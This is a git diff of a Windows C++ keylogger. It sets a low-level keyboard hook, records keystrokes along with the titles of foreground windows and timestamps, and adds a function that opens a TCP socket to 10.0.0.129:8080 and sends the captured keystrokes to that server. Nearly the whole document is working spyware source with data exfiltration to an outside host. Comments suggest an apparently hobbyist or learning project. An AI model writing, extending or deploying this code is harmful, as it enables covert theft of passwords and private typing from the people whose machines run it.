@@ -8,8 +8,11 @@
 #include <sstream>
 #include <time.h>
 #include <map>
-using namespace std;
+#include <cstring>
+#include <ws2tcpip.h>
+#include <thread>
 
+using namespace std;
 
 /*
 
@@ -31,30 +34,31 @@ implement use of virtual keyboard layout, refer to github example
 */
 
 HHOOK _hook = NULL;
+
 std::ofstream logFile;
 void startLogging();
 void computerInformation();
 LRESULT CALLBACK hookCallBack(int nCode, WPARAM wParam, LPARAM lParam);
 HKL getKeyboardLayout();
-void protoLog();
-LRESULT CALLBACK protoHookCallBack(int nCode, WPARAM wParam, LPARAM lParam);
+stringstream fetchWindow();
+std::stringstream keyStrokes;
 
-map<int, string> keyname {
+map<int, string> keyname { // modify these laters to filter out meaningful inputs from unmeanginful
    
-    {VK_BACK, "[BACKSPACE]" },
+    {VK_BACK, "" },
 	{VK_RETURN,	"[ENTER]\n" },
 	{VK_SPACE,	" "},
 	{VK_TAB,	"[TAB]" },
 	{VK_SHIFT,	"[SHIFT]" },
-	{VK_LSHIFT,	"[LSHIFT]" },
-	{VK_RSHIFT,	"[RSHIFT]" },
+	{VK_LSHIFT,	""},
+	{VK_RSHIFT,	""},
 	{VK_CONTROL,	"[CONTROL]" },
-	{VK_LCONTROL,	"[LCONTROL]" },
-	{VK_RCONTROL,	"[RCONTROL]" },
+	{VK_LCONTROL,	"[LCTRL]" },
+	{VK_RCONTROL,	"[RCTRL]" },
 	{VK_MENU,	"[ALT]" },
 	{VK_LWIN,	"[LWIN]" },
 	{VK_RWIN,	"[RWIN]" },
-	{VK_ESCAPE,	"[ESCAPE]" },
+	{VK_ESCAPE,	""},
 	{VK_END,	"[END]" },
 	{VK_HOME,	"[HOME]" },
 	{VK_LEFT,	"[LEFT]" },
@@ -64,53 +68,7 @@ map<int, string> keyname {
 	{VK_PRIOR,	"[PG_UP]" },
 	{VK_NEXT,	"[PG_DOWN]" },
     {VK_DELETE, "[DELETE]"},
-	{VK_CAPITAL,	"[CAPSLOCK]" },
-    {VK_OEM_PLUS, "="},
-    {VK_OEM_MINUS, "-"},
-    {VK_OEM_PERIOD, "."},
-    {VK_OEM_COMMA, ","},
-    {0x41, "a"},
-    {0x42, "b"},
-    {0x43, "c"},
-    {0x44, "d"},
-    {0x45, "e"},
-    {0x46, "f"},
-    {0x47, "g"},
-    {0x48, "h"},
-    {0x49, "i"},
-    {0x4A, "j"},
-    {0x4B, "k"},
-    {0x4C, "l"},
-    {0x4D, "m"},
-    {0x4E, "n"},
-    {0x4F, "o"},
-    {0x50, "p"},
-    {0x51, "q"},
-    {0x52, "r"},
-    {0x53, "s"},
-    {0x54, "t"},
-    {0x55, "u"},
-    {0x56, "v"},
-    {0x57, "w"},
-    {0x58, "x"},
-    {0x59, "y"},
-    {0x5A, "z"},
-    {0x30, "0"}, 
-    {0x31, "1"}, 
-    {0x32, "2"}, 
-    {0x33, "3"}, 
-    {0x34, "4"}, 
-    {0x35, "5"}, 
-    {0x36, "6"}, 
-    {0x37, "7"}, 
-    {0x38, "8"}, 
-    {0x39, "9"}, 
-    {VK_OEM_1, ";"},
-    {VK_OEM_2, "/"},
-    {VK_OEM_7, "'"},
-    {VK_OEM_6, "]"},
-    {VK_OEM_4, "["},
-    {VK_OEM_5,  "\\"},
+	{VK_CAPITAL,"" },
     {VK_F1, "[F1]"},
     {VK_F2, "[F2]"},
     {VK_F3, "[F3]"},
@@ -130,7 +88,6 @@ map<int, string> keyname {
 map<int, char> altKeyname { // for characters acheived through shift + xyz
 
 // all values in altKeyname must exist in keyname 
-
     
     {VK_SPACE,	' '},
     {VK_OEM_PLUS, '+'},
@@ -152,161 +109,174 @@ map<int, char> altKeyname { // for characters acheived through shift + xyz
     {0x36, '^'}, 
     {0x37, '&'}, 
     {0x38, '*'}, 
-    {0x39, '('}, 
-    {0x41, 'A'},
-    {0x42, 'B'},
-    {0x43, 'C'},
-    {0x44, 'D'},
-    {0x45, 'E'},
-    {0x46, 'F'},
-    {0x47, 'G'},
-    {0x48, 'H'},
-    {0x49, 'I'},
-    {0x4A, 'J'},
-    {0x4B, 'K'},
-    {0x4C, 'L'},
-    {0x4D, 'M'},
-    {0x4E, 'N'},
-    {0x4F, 'O'},
-    {0x50, 'P'},
-    {0x51, 'Q'},
-    {0x52, 'R'},
-    {0x53, 'S'},
-    {0x54, 'T'},
-    {0x55, 'U'},
-    {0x56, 'V'},
-    {0x57, 'W'},
-    {0x58, 'X'},
-    {0x59, 'Y'},
-    {0x5A, 'Z'},
-
+    {0x39, '('},
+     
 };
 
-int main() {
+bool newWindow() {
+    static char lastWindow[256] = "";
+    HWND foreground = GetForegroundWindow();
 
-    protoLog();
-    return 0;
-    /*
-    startLogging();
-    cout << "Logger closed." << endl; // maybe display log file path after?
-    return 0;
-    */
+    if (foreground != NULL) {
+		char window[256]; // pointer to the current window 
+		GetWindowTextA(foreground, (LPSTR)window, 256); // retrieves the text in a window's title bar
 
-}
+		if (strcmp(window, lastWindow) != 0) {
 
-void protoLog() {
-    ::logFile.open("log.txt", ios::app);  
-    _hook = SetWindowsHookEx(WH_KEYBOARD_LL, protoHookCallBack, NULL, 0);
-    MSG msg;
-    while (GetMessage(&msg, NULL, 0, 0)) {
-        ;
-    }
-    UnhookWindowsHookEx(_hook);
-    ::logFile.close();  // Close the log file
+            strcpy_s(lastWindow, sizeof(lastWindow), window);
+            return true;
 
-    
-
-
-}
-LRESULT CALLBACK protoHookCallBack(int nCode, WPARAM wParam, LPARAM lParam) {
-    if (nCode < 0) {
-        // do nothing
-    } else {
-        if (wParam == WM_KEYDOWN) {
-            HKL layout = getKeyboardLayout();
-            KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
-            int code = kbdStruct->vkCode;
-            char key;
-            key = MapVirtualKeyExA(code, MAPVK_VK_TO_CHAR, layout);
-
-            if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
-
-                logFile << char(key);
-
-            } else if (GetKeyState(VK_CAPITAL) & 0x0001) {
-                logFile << char(key);
-            } else {
-                key = tolower(key);
-                logFile << char(key);
-            }
-
-            
-            ::logFile.flush();
         }
     }
-    
-    return CallNextHookEx(_hook, nCode, wParam, lParam);
+    return false;
 }
 
+std::stringstream fetchWindow() { 
+   stringstream windowName; 
+   windowName.str("");
+    HWND foreground = GetForegroundWindow();
+    if (foreground != NULL) {
+		char window[256]; // pointer to the current window 
+		GetWindowTextA(foreground, (LPSTR)window, 256); // retrieves the text in a window's title bar
+        time_t currentTime = time(NULL); // retrieve time
+		windowName << "\n" << "Window: " << window << " || Time and Date: " << ctime(&currentTime) << "\n";
+        return windowName;
+    }
+    return windowName; // if the conditonal isn't reached, this returns empty string stream object ("")
 
-HKL getKeyboardLayout() {
-    return GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL));
 }
+
+void sendKeystrokesToServer(std::stringstream &keystrokesStream) {
+    std::string keystrokes = keystrokesStream.str();
+    WSADATA wsaData;
+    SOCKET ConnectSocket = INVALID_SOCKET;
+    struct sockaddr_in clientService;
+
+    // Initialize Winsock
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        std::cerr << "WSAStartup failed" << std::endl;
+        return;
+    }
+
+    // Create socket
+    ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (ConnectSocket == INVALID_SOCKET) {
+        std::cerr << "Socket creation failed" << std::endl;
+        WSACleanup();
+        return;
+    }
+
+    // Fill in server address structure
+    clientService.sin_family = AF_INET;
+    clientService.sin_addr.s_addr = inet_addr("10.0.0.129");
+    clientService.sin_port = htons(8080);
+
+    // Connect to server
+    if (connect(ConnectSocket, (struct sockaddr *)&clientService, sizeof(clientService)) == SOCKET_ERROR) {
+        std::cerr << "Connection to server failed" << std::endl;
+        closesocket(ConnectSocket);
+        WSACleanup();
+        return;
+    }
+
+    // Send keystrokes data to server
+    if (send(ConnectSocket, keystrokes.c_str(), keystrokes.length(), 0) == SOCKET_ERROR) {
+        std::cerr << "Sending data to server failed" << std::endl;
+        closesocket(ConnectSocket);
+        WSACleanup();
+        return;
+    }
+
+    // Close socket and cleanup
+    closesocket(ConnectSocket);
+    WSACleanup();
+}
+
 
 LRESULT CALLBACK hookCallBack(int nCode, WPARAM wParam, LPARAM lParam) {
-
+    
     if (nCode < 0) {
-        // do nothing
+        ;
     } else {
-        KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam; // kbd struct, holds event being caught
-        int key = kbdStruct->vkCode;
+
+        HKL layout = getKeyboardLayout(); // user's keyboard layout; generates a virtual layout to map keys to
+        KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam; // used to capture low-level keyboard hooks
+        int code = kbdStruct->vkCode; 
+        char key;
+        key = MapVirtualKeyExA(code, MAPVK_VK_TO_CHAR, layout); // returns a character code
+        
         if (wParam == WM_KEYDOWN) {
+
+            if (newWindow() != false) { // if we are at a new window, send all the keystrokes captured to the server
+                stringstream windowName = fetchWindow();
+                sendKeystrokesToServer(windowName);
+            }
             
             if (key == VK_ESCAPE) { // terminate message (remove later when gui made for start/stop button)
-                ::logFile << "\n";
+                sendKeystrokesToServer(keyStrokes); // send remaining keystrokes to the server
+                keyStrokes << "\n";
                 PostQuitMessage(0);
+            }
 
-            } else if (keyname.find(key) != keyname.end()) { // able to find a corresponding key in the keyname map 
+            if ((GetKeyState(VK_SHIFT) & 0x8000) != 0 || (GetKeyState(VK_LSHIFT) & 0x8000) != 0 || (GetKeyState(VK_RSHIFT) & 0x8000) != 0) { // shift is being pressed down
 
-                if (GetAsyncKeyState(VK_SHIFT) & 0x8000) { // characters acheived through shift key
-
-                    if (altKeyname.find(key) == altKeyname.end() || keyname.find(key) == keyname.end()) { // if you are holding down shift, but not pressing other letters after holding it down
-
-                        ::logFile << "";
-
-                    } else {
-                        ::logFile << altKeyname.find(key)->second; // routes   
-                    }
-                    
-                } else if (GetKeyState(VK_CAPITAL) & 0x0001) { // if caps lock toggled on 
-                    
-                    char c = keyname.find(key)->second[0];
-
-                    
-                    if (isalpha(c)) { // check if c is a alphabet letter
-                        char upperCase = toupper(c);
-                        ::logFile << upperCase; 
-                    } else {
-                        ::logFile << keyname.find(key)->second; 
-                    }
-                    
-                    
+                if (altKeyname.find(code) != altKeyname.end()) {
+                    keyStrokes << altKeyname.find(code)->second;
                 } else {
-                    ::logFile << keyname.find(key)->second;
-                    
+                    if (key != 0) { // check if a key was properly mapped to the layout
+                        keyStrokes << char(key);
+                    }   
                 }
-                
+            } else if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0) { // check for caps lock
+
+                if (key != 0) {
+                    keyStrokes << char(key);
+                }
+
             } else {
-                // enter here if key is == to an alphabet, no special symbols
-                ::logFile << "[UNKNOWNINPUT]";
+                
+                if (keyname.find(code) != keyname.end()) { // search for special input (alt, ctrl, etc)
+                    keyStrokes << keyname.find(code)->second;
+                } else {   
+
+                    if (key != 0) {
+                        keyStrokes << char(tolower(key)); // otherwise, assume the input is an alphanumeric character, and convert to lowercase
+                    }
+
+                }    
             }
         }
     }
-
     return CallNextHookEx(_hook, nCode, wParam, lParam);
 }
 
 void startLogging() {
-    cout << "Logging started." << endl;
-    ::logFile.open("log.txt", ios::app);  
+
+    // initialize variables to run logging
+    const char* logFilename = "log.txt";
+    logFile.open(logFilename, ios::app);  
     _hook = SetWindowsHookEx(WH_KEYBOARD_LL, hookCallBack, NULL, 0);
     MSG msg;
 
     while (GetMessage(&msg, NULL, 0, 0)) {
         ;
-    }
+    }  
+
     UnhookWindowsHookEx(_hook);
-    
-    ::logFile.close();  // Close the log file
+    logFile.close();  // Close the log file
+
 }
 
+HKL getKeyboardLayout() { // returns layout of user's current keyboard
+    return GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL));
+}
+
+int main() {
+
+    cout << "Logging started." << endl;
+    startLogging();
+    //sendKeystrokesToServer(keyStrokes);
+    cout << "Logger closed." << endl;
+    return 0;
+    
+}
